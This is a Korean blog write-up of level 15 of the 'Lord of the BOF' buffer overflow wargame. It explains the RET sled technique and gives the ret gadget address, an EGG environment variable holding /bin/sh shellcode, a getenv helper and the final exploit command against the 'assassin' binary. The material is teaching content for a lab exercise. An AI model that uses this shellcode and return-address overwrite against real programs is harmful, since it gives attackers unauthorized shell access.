---
layout: post
title: "The Lord of the BOF - Level 15"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level15/1.jpg" | relative_url }}' alt='relative'>  

## 1) giant/one step closer 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level15/2.png" | relative_url }}' alt='relative'>  

48번째 byte는 '\xbf'이거나 '\x40'이면 안 됩니다.  
또한 buffer 배열과 SFP를 모두 0으로 덮어 씁니다.  

이 문제는 RET Sled 문제입니다.  

## 2) RET Sled란?  

ret 명령을 한 번 더 실행시켜 shellcode를 실행시킵니다. RET에 ret 가젯을 삽입해 RET를 뒤로 지연시켜 Sled라고 부릅니다.  
삽입된 ret 가젯으로 shellcode 주소로 jump하여 shellcode를 실행합니다.  

기존 프로그램은 ret 명령을 수행하면 esp 레지스터가 가리키는 주소에 저장된 값이 eip 레지스터에 pop 되고, eip 레지스터에 저장된 주소로 jump 합니다.  
즉, pop-jump 흐름으로 진행됩니다. 하지만 RET Sled는 pop-pop-jump 흐름으로 진행됩니다.  

RET Sled의 흐름으로 shellcode를 진행시키고자 한다면 스택에 buffer 40 byte, SFP 4 byte, RET 4 byte 순서로 저장되어 있는 형식을 buffer 40 byte, dummy 4 byte, &ret 4 byte, &shellcode 4 byte 순서로 저장합니다.  

ret 명령어에서 eip는 &ret 주소를 저장(pop)하고 &ret 주소로 이동(jump)합니다. 그러면 ret 명령을 또 실행하게 됩니다. esp는 &ret 다음에 저장되어 있는 &shellcode 주소를 가리키고 있으므로 eip는 &shellcode를 저장(pop)하고 &shellcode 주소로 이동(jump)합니다.  

RET Sled로 이 문제를 해결하기 위해:  
#### (1) ret의 주소 확인하기  

#### (2) shellcode를 환경변수에 저장하기  

두 작업을 먼저 진행해야 합니다.  

## 3) ret 주소 확인하기  

<img data-action="zoom" src='{{ "assets/lob/level15/3.png" | relative_url }}' alt='relative'>  

ret 명령어는 0x804851e 주소에 저장되어 있습니다.  

&ret에는 0x804851e을 입력하면 됩니다. 리틀엔디언 형식이니 페이로드에는 "\x1e\x85\x04\x08"을 입력하면 됩니다.  

## 4) shellcode 환경변수에 저장하기  

``` bash 
export EGG=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` c
// getenv.c
#include <stdio.h>
#include <stdlib.h>
int main(void) {
	printf("ADDR: %p\n", getenv("EGG"));
	return 0;
}
```

<img data-action="zoom" src='{{ "assets/lob/level15/4.png" | relative_url }}' alt='relative'>  

shellcode를 담고있는 환경변수는 0xbffffe57 주소에 저장되어 있습니다.  

&shellcode에는 0xbffffe57을 입력하면 됩니다. 리틀엔디언 형식이니 페이로드에는 "\x57\xfe\xff\xbf"을 입력하면 됩니다.  

## 5) 페이로드 입력하여 BOF 일으키기  

앞서 모은 정보로 페이로드를 완성시켰습니다.  

``` bash 
./assassin `python -c 'print "\x90"*44+"\x1e\x85\x04\x08"+"\x57\xfe\xff\xbf"'`
```

<img data-action="zoom" src='{{ "assets/lob/level15/5.png" | relative_url }}' alt='relative'>  